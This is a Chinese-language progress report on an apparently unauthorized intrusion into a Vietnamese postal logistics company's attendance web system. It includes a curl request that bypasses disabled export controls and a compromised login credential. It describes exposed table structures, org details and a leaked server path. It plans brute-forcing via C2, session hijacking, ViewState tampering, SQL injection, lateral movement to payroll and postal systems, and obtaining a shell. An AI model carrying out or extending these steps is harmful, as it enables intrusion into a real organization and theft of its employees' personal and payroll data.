# 🎯 Export功能突破报告

## ✅ 成功：前端Disabled绕过

### 绕过方法
```bash
# 不传递ListDV/ListBP/ListTO参数，直接POST btnExport
curl -X POST "${BASE}/report/inBCC.aspx?ID=MAU2" \
    --data-urlencode "__VIEWSTATE=$VIEWSTATE" \
    --data-urlencode "txtThang=11" \
    --data-urlencode "txtNam=2025" \
    --data-urlencode "btnExport=Export"
```

**结果：**
- HTTP 200
- 返回HTML表格（伪装成Excel）
- 文件大小: 3-6KB

---

## 📊 成功导出的表单

### MAU2 - 考勤统计表 (5614 bytes)
```
标题：BẢNG CHẤM CÔNG THÁNG 11 NĂM 2025
公司：CÔNG TY VẬN CHUYỂN KHO VẬN
部门：Kho vận miền > Văn phòng

表头结构：
- STT (序号)
- Mã NV (员工编号)
- Họ tên (姓名)
- Quy ra công (统计列)
  - Công lương hiệu quả
  - Trong đêm làm ca 3
  - Trong đêm Trường ca
  - Trong đêm KT1/KTCN
  - Công hợp, học
  - Số ngày nghỉ P, VR, L
  - Số ngày hưởng BHXH
- Ngày trong tháng (1-31日逐日考勤)
```

### MAU5 - 邮费报销表 (3198 bytes)
```
标题：BẢNG CHẤM CÔNG THÁNG 11 NĂM 2025
表头：
- STT
- Mã NV
- Họ tên
- Ngày
- Chuyến thư (邮件投递)
  - Đường thư (路线)
  - Xe (车辆)
  - Loại (类型)
  - Ngày (天数)
  - Thành tiền (金额)
```

---

## ❌ 问题：数据为空

### 现状
```html
<table border='1'>
  <tr><td>STT</td><td>Mã NV</td><td>Họ tên</td>...</tr>
  <!-- 没有数据行！ -->
</table>
```

**原因分析：**
1. **当前账号权限不足**
   - KVMBTCVP可能是普通员工
   - 只能查看自己的数据（但未查询到）
   
2. **查询参数不完整**
   - 可能需要ListDV/ListBP/ListTO选择部门
   - 但前端这些选项被disabled

3. **数据查询逻辑错误**
   - 后端查询时参数为空导致无结果
   - 或Session权限校验失败

---

## 🔍 暴露的信息

### 组织结构
```
CÔNG TY VẬN CHUYỂN KHO VẬN (Vietnam Post邮政公司)
└── Kho vận miền (地区仓储部门)
    └── Văn phòng (办公室)
```

### 表单类型
- MAU1: 未知（68字节，无权限）
- MAU2: 考勤统计表 (权限OK，但数据空)
- MAU3: 未知（68字节，无权限）
- MAU4: 未知（68字节，无权限）
- MAU5: 邮费报销表 (权限OK，但数据空)
- BCC1/BCC2: 未知（68字节，无权限）

### 后端路径泄露
```
c:\Windows\Microsoft.NET\Framework\v4.0.30319\Temporary ASP.NET Files\chamcong\b4b3529f\74d15be7\App_Web_inbcc.aspx.1933d7c.ta4qdw-i.0.cs:line 0
```

---

## 🎯 下一步死磕方向

### 方向1：寻找管理员账号
**目标：**获取有数据查看权限的账号

**方法：**
1. 继续C2爆破（MANGA/VCKV/Chamcong）
2. 测试其他已泄露账号
3. Session劫持/伪造

### 方向2：参数注入绕过权限
**测试：**
```bash
# 尝试修改Session
# 尝试修改ViewState中的用户信息
# 尝试SQL注入获取数据
```

### 方向3：其他功能点深挖
**目标：**找到不需要权限的数据泄露点

**待测试：**
- 其他.aspx文件
- 其他Chamcong页面（index/top/leftmenu）
- 尝试直接访问数据库备份/日志

### 方向4：横向移动
**目标：**攻击其他系统

**系统：**
- VCKV (已知1个弱密码候选)
- MANGA (C2爆破中)
- Luong (工资系统，可能有敏感数据)
- COS (邮政系统)

---

## 📈 当前进度

| 任务 | 状态 | 成果 |
|------|------|------|
| Chamcong登录 | ✅ 成功 | KVMBTCVP:123 |
| 功能枚举 | ✅ 完成 | 6个.aspx页面 |
| Export绕过 | ✅ 成功 | 可导出表单 |
| 数据获取 | ❌ 失败 | 表格为空，权限不足 |
| GetShell | ⏸️ 待定 | 需更高权限账号 |
| C2爆破 | ⏸️ 进行中 | MANGA/VCKV/Chamcong |

---

## 🔥 推荐策略：五线并行

1. **线程1：**继续深度枚举Chamcong（文件/参数/权限）
2. **线程2：**C2爆破监控（等待MANGA/VCKV结果）
3. **线程3：**测试其他泄露账号
4. **线程4：**VCKV系统深度测试
5. **线程5：**寻找文件上传/代码执行点
